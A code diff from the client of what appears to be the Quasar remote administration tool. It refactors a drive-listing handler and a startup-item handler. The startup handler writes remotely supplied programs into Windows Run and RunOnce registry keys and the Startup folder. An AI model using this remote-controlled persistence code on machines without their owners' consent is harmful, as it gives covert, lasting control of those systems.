@@ -8,12 +8,14 @@ using System.Windows.Forms;
 using Microsoft.Win32;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
+using Quasar.Common.Models;
 using xClient.Config;
 using xClient.Core.Data;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
+using File = System.IO.File;
 
 namespace xClient.Core.Commands
 {
@@ -22,10 +24,10 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetDrives(GetDrives command, Client client)
         {
-            DriveInfo[] drives;
+            DriveInfo[] driveInfos;
             try
             {
-                drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
+                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
             }
             catch (IOException)
             {
@@ -38,39 +40,34 @@ namespace xClient.Core.Commands
                 return;
             }
 
-            if (drives.Length == 0)
+            if (driveInfos.Length == 0)
             {
                 client.Send(new SetStatusFileManager {Message = "GetDrives No drives", SetLastDirectorySeen = false});
                 return;
             }
 
-            string[] displayName = new string[drives.Length];
-            string[] rootDirectory = new string[drives.Length];
+            Drive[] drives = new Drive[driveInfos.Length];
             for (int i = 0; i < drives.Length; i++)
             {
-                string volumeLabel = null;
                 try
                 {
-                    volumeLabel = drives[i].VolumeLabel;
-                }
-                catch
-                {
-                }
+                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
+                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
+                            driveInfos[i].VolumeLabel,
+                            FormatHelper.DriveTypeName(driveInfos[i].DriveType), driveInfos[i].DriveFormat)
+                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
+                            FormatHelper.DriveTypeName(driveInfos[i].DriveType), driveInfos[i].DriveFormat);
 
-                if (string.IsNullOrEmpty(volumeLabel))
-                {
-                    displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
-                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                    drives[i] = new Drive
+                        { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                 }
-                else
+                catch (Exception)
                 {
-                    displayName[i] = string.Format("{0} ({1}) [{2}, {3}]", drives[i].RootDirectory.FullName, volumeLabel,
-                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                    
                 }
-                rootDirectory[i] = drives[i].RootDirectory.FullName;
             }
 
-            client.Send(new GetDrivesResponse {DriveDisplayName = displayName, RootDirectory = rootDirectory});
+            client.Send(new GetDrivesResponse {Drives = drives});
         }
 
         public static void HandleDoShutdownAction(DoShutdownAction command, Client client)
@@ -177,32 +174,32 @@ namespace xClient.Core.Commands
         {
             try
             {
-                switch (command.Type)
+                switch (command.StartupItem.Type)
                 {
                     case 0:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case 1:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case 2:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case 3:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
@@ -212,7 +209,7 @@ namespace xClient.Core.Commands
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
@@ -222,7 +219,7 @@ namespace xClient.Core.Commands
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
@@ -234,14 +231,14 @@ namespace xClient.Core.Commands
                         }
 
                         string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
-                            command.Name + ".url");
+                            command.StartupItem.Name + ".url");
 
                         using (var writer = new StreamWriter(lnkPath, false))
                         {
                             writer.WriteLine("[InternetShortcut]");
-                            writer.WriteLine("URL=file:///" + command.Path);
+                            writer.WriteLine("URL=file:///" + command.StartupItem.Path);
                             writer.WriteLine("IconIndex=0");
-                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
+                            writer.WriteLine("IconFile=" + command.StartupItem.Path.Replace('\\', '/'));
                             writer.Flush();
                         }
                         break;
